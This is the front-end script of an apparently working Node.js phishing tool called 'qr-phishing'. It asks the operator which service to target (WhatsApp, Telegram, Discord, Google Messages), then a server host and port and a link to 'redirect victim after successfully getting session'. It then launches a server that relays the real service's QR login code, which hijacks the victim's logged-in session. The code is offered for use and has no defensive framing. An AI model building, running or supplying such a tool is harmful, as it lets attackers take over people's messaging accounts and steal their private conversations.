#!/usr/bin/env node
import { Worker, isMainThread } from "node:worker_threads";
import chalk from "chalk";
import inquirer from "inquirer";
import { Command } from "commander";
import gradient from "gradient-string";
import chalkAnimation from "chalk-animation";
import figlet from "figlet";
import { createSpinner } from "nanospinner";
import { connector } from "./connector.mjs";

function start(type, hostname, port, link) {
  if (isMainThread) {
    const httpWorker = new Worker("./HTTPServer.js", {
      workerData: { hostname: hostname, port: parseInt(port), link: link },
    });
    console.log(
      gradient.rainbow(
        "Started fetching QR (Quick Response) code from the Web Service"
      )
    );
    connector(type, httpWorker).catch((e) => console.log(e));
  }
}

function question() {
  inquirer
    .prompt([
      {
        type: "list",
        name: "module",
        message: chalk.yellowBright("Which Service? You want to phish: "),
        choices: ["Message", "Whatsapp", "Telegram", "Discord", "localhost"],
      },
    ])
    .then((answer1) => {
      const spinner1 = createSpinner(
        chalk.blueBright("Setting the service and loading next question...")
      ).start();
      setTimeout(() => {
        spinner1.success();
        inquirer
          .prompt([
            {
              name: "host",
              message: gradient.fruit("Enter Host IP to use phishing server :"),
              default: "localhost",
            },
          ])
          .then((answer2) => {
            const spinner2 = createSpinner(
              chalk.blueBright(
                "Setting the host ip and loading next question..."
              )
            ).start();
            setTimeout(() => {
              spinner2.success();
              inquirer
                .prompt([
                  {
                    name: "port",
                    message: gradient.cristal(
                      "Enter Port no to use phishing server :"
                    ),
                    default: "8200",
                  },
                ])
                .then((answer3) => {
                  const spinner3 = createSpinner(
                    chalk.blueBright(
                      "Setting the port no and loading next question..."
                    )
                  ).start();
                  setTimeout(() => {
                    spinner3.success();
                    inquirer
                      .prompt([
                        {
                          name: "relink",
                          message: gradient.morning(
                            "Paste Link to redirect victim after successfully getting session :"
                          ),
                          default: "google.com",
                        },
                      ])
                      .then((answer4) => {
                        const spinner4 = createSpinner(
                          chalk.blueBright(
                            "Setting the redirect link and starting the phishing server..."
                          )
                        ).start();
                        setTimeout(() => {
                          spinner4.success();
                          start(
                            answer1.module,
                            answer2.host,
                            answer3.port,
                            answer4.relink
                          );
                        }, 1000);
                      });
                  }, 1000);
                });
            }, 1000);
          });
      }, 1000);
    });
}

const program = new Command("qr-phishing");
program
  .name("qr-phishing")
  .description(
    "QR Code Phishing of various services like Google Message Web, Whatsapp Web, Discord Web, Telegram Web etc."
  )
  .version("1.0.0", "-v, --version");
program
  .command("start")
  .alias("sp")
  .description("Start Phishing")
  .action(() => {
    const anim = chalkAnimation.rainbow(figlet.textSync("QRPhishing"));
    setTimeout(() => {
      anim.stop();
      console.log(
        gradient.rainbow(
          `Welcome to QRPhishing.\nYou can phish qr code of various services like Google Message Web, Whatsapp Web, Discord Web, Telegram Web etc.\nFollow the questions to get started.`
        )
      );
      const spinner = createSpinner(
        chalk.blueBright("Loading Questions...")
      ).start();
      setTimeout(() => {
        spinner.success();
        question();
      }, 1000);
    }, 3000);
  });
program.parse(process.argv);
